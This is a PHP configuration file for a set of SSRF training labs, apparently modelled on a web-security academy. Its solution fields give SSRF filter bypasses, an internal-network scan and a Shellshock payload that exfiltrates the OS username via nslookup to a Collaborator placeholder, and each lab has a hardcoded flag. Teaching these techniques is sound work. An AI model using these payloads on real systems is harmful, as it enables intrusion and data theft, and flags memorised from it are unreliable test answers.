<?php
// Define an array of challenges, each identified by a unique ID
$challenges = array(
    // Challenge 1: Basic SSRF against the local server
    'lab1' => array(
        'task' => 'Basic SSRF against the local server', // Title of the task
        'description' => 'This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.', // Description of the task
        'pagUrl' => '/ssrf-project/lab1/index.html', // URL of the page where the challenge is hosted
        'flag' => "FJ92hdj#s2F4", // Flag required to complete the challenge
        'defination' => 'Basic SSRF against the local server" refers to a security challenge where attackers exploit a vulnerability called Server-Side Request Forgery (SSRF) to manipulate a web server into making requests to its own local resources or services. The goal is to gain unauthorized access to sensitive information or functionality within the server`s network.',
        'solution'=>'1. Browse to /admin and observe that you can`t directly access the admin page.<br>2. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.<br> 3.Change the URL in the stockApi parameter to http://localhost/admin. This should display the administration interface.<br> 4.Read the HTML to identify the URL to delete the target user, which is:http://localhost/admin/delete?username=carlos <br>5. Submit this URL in the stockApi parameter, to deliver the SSRF attack.',
        'reference' => array("https://www.youtube.com/watch?v=lMxCQcktifs","https://www.youtube.com/watch?v=4oXH8qRqDPQ","https://www.youtube.com/watch?v=yblAc0upHC4"),
    ),
    // Challenge 2: Basic SSRF against another back-end system
    'lab2' => array(
        'task' => 'Basic SSRF against another back-end system',
        'description' => 'This lab has a stock check feature which fetches data from an internal system. To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.',
        'note' => 'Note* To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator`s default public server.',
        'pagUrl' => '/ssrf-project/lab2/index.html',
        'flag' => "gP3Lmz9@xTQ",
        'defination' => 'Basic SSRF against another back-end system" involves exploiting a vulnerability to manipulate a web application into sending unauthorized requests to internal or external systems, potentially leading to data leakage, service disruption, or unauthorized access to sensitive information.',
        'solution' => '1.Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Intruder. <br> 2. Click "Clear §", change the stockApi parameter to http://192.168.0.1:8080/admin then highlight the final octet of the IP address (the number 1), click "Add §". <br> 3. Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively. <br> 4. Click "Start attack". <br> 5. Click on the "Status" column to sort it by status code ascending. You should see a single entry with a status of 200, showing an admin interface. <br> 5. Click on this request, send it to Burp Repeater, and change the path in the stockApi to: /admin/delete?username=carlos',
        'reference' => array("https://www.youtube.com/watch?v=Ku6CK3Aes8Y","https://www.youtube.com/watch?v=t4Hrq7TCTPU","https://www.youtube.com/watch?v=Y26I3blLTdk"),
    ),
    // Challenge 3: Blind SSRF with out-of-band detection
    'e2cdaa6e-f53f-4c5e-8268-820f26af4543' => array(
        'task' => 'Blind SSRF with out-of-band detection',
        'description' => 'This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.',
        'pagUrl' => '/ssrf-project/e2cdaa6e-f53f-4c5e-8268-820f26af4543/index.html',
        'flag' => "5nY#kP6r&vW8",
        'defination' => 'Blind SSRF with out-of-band detection" is a technique where an attacker leverages Server-Side Request Forgery (SSRF) to trigger requests to an external server that contains a unique identifier in its response. By monitoring for interactions with this identifier, typically through DNS or HTTP requests, the attacker can infer successful exploitation of the SSRF vulnerability without direct access to the server`s response. This approach enables attackers to bypass network restrictions and access sensitive internal resources indirectly.',
        'solution' => '1. Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater. <br> 2. Go to the Repeater tab. Select the Referer header, right-click and select "Insert Collaborator Payload" to replace the original domain with a Burp Collaborator generated domain. Send the request. <br> 3. Go to the Collaborator tab, and click "Poll now". If you don`t see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. <br> 4.You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.',
        'reference'=> array("https://www.youtube.com/watch?v=GAQFQhdrM1M","https://www.youtube.com/watch?v=lL6Msbkwhyk"),
    ),
    // Challenge 4: SSRF with blacklist-based input filter
    'lab3' => array(
        'task' => 'SSRF with blacklist-based input filter',
        'description' => 'This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. The developer has deployed two weak anti-SSRF defenses that you will need to bypass.',
        'pagUrl' => '/ssrf-project/lab3/index.html',
        'flag' => "dG7pQz@Lm9N",
        'defination' => 'SSRF with blacklist-based input filtering is a scenario where a web application tries to mitigate Server-Side Request Forgery (SSRF) attacks by implementing a blacklist of disallowed URLs or IP addresses. In this setup, the application blocks requests to known malicious or restricted destinations. However, attackers can still potentially bypass this protection by finding ways to obfuscate or encode their malicious URLs, allowing them to exploit SSRF vulnerabilities despite the blacklist-based filtering.',
        'solution' => '1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater. <br> 2. Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the request is blocked. <br> 3.Bypass the block by changing the URL to: http://127.1/ <br> 4.Change the URL to http://127.1/admin and observe that the URL is blocked again. <br> 5.Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.',
        'reference' => array("https://www.youtube.com/watch?v=YGyEH3qDtWg","https://www.youtube.com/watch?v=vO0EqpX6PCQ","https://www.youtube.com/watch?v=y_lq8mfUwcs"),
    ),
    // Challenge 5: SSRF with filter bypass via open redirection vulnerability
    'fffa5b92-e28a-4e4a-b307-2a7c94cf3f14' => array(
        'task' => 'SSRF with filter bypass via open redirection vulnerability',
        'description' => 'This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos. The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.',
        'pagUrl' => '/ssrf-project/fffa5b92-e28a-4e4a-b307-2a7c94cf3f14/index.html',
        'flag' => "Hf2%jD5*KpR7",
        'defination' => 'SSRF with filter bypass via open redirection vulnerability involves exploiting a web application`s SSRF vulnerability by redirecting requests through a trusted domain to bypass SSRF filters.',
        'solution' => '1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater. <br> 2. Try tampering with the stockApi parameter and observe that it isn`t possible to make the server issue the request directly to a different host. <br> 3.Click "next product" and observe that the path parameter is placed into the Location header of a redirection response, resulting in an open redirection. <br> 5.Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, and feed this into the stockApi parameter on the stock checker: /product.php/nextProduct?path=http://192.168.0.12:8080/admin <br> 6. Amend the path to delete the target user:/product.php/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos',
        'reference' => array("https://www.youtube.com/watch?v=iF1BPVTqM10","https://www.youtube.com/watch?v=MZMGF_qD6DQ"),
    ),
    // Challenge 6: Blind SSRF with Shellshock exploitation
    'fffa5b92-e28a-4e4a-b307-2a7c94cf3f15' => array(
        'task' => 'Blind SSRF with Shellshock exploitation',
        'description' => 'This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.',
        'note' => 'Note* To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator`s default public server.',
        'pagUrl' => '/ssrf-project/fffa5b92-e28a-4e4a-b307-2a7c94cf3f15/index.html',
        'flag' => "sT4#Nj7&rVpQ",
        'defination' => 'Blind SSRF with Shellshock exploitation involves leveraging the Shellshock vulnerability to execute arbitrary commands on the server, allowing attackers to indirectly interact with internal systems and resources via SSRF.',
        'solution' => '1. In Burp Suite Professional, install the "Collaborator Everywhere" extension from the BApp Store. <br> 2. Add the domain of the lab to Burp Suite`s target scope, so that Collaborator Everywhere will target it.<br> 3. Browse the site. <br> 4.Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header. <br> 5. Observe that the HTTP interaction contains your User-Agent string within the HTTP request. <br> 6. Send the request to the product page to Burp Intruder. <br> 7.Go to the Collaborator tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN <br> 8. Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain. <br> 9.Click "Clear §", change the Referer header to http://192.168.0.1:8080 then highlight the final octet of the IP address (the number 1), click "Add §". <br> 10.Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively. <br> 11. Click "Start attack". <br> 12. When the attack is finished, go back to the Collaborator tab, and click "Poll now". If you don`t see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. The name of the OS user should appear within the DNS subdomain. <br> 13. To complete the lab, enter the name of the OS user. ',
        'reference' => array("https://www.youtube.com/watch?v=k84FLMFtuE4","https://www.youtube.com/watch?v=eW4QDUytHrY"),
    ),
    // Challenge 7: SSRF with whitelist-based input filter
    'lab4' => array(
        'task' => 'SSRF with whitelist-based input filter',
        'description' => 'This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. The developer has deployed an anti-SSRF defense you will need to bypass.',
        'pagUrl' => '/ssrf-project/lab4/index.html',
        'flag' => "9mPLz2#Gf3R",
        'defination' => 'SSRF with whitelist-based input filter involves restricting SSRF requests to a predefined list of allowed URLs or IP addresses. This mitigates the risk of SSRF attacks by only permitting requests to trusted destinations, preventing unauthorized access to internal resources.',
        'solution' => '1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater. <br> 2. Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist. <br> 3. Change the URL to http://localhost@example.com/ and observe that this is accepted, indicating that the URL parser supports embedded credentials. <br> 4. Append a # to the username and observe that the URL is now rejected. <br> 5.Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "localhost". <br> To access the admin interface and delete the target user, insert a new path into the URL: http://localhost%2523@admin/delete?username=carlos',
        'reference' => array("https://www.youtube.com/watch?v=0PmoY9vuSb0","https://www.youtube.com/watch?v=LKseM-xG9DQ","https://www.youtube.com/watch?v=I4VwZ0RJozA"),
    )
);
?>
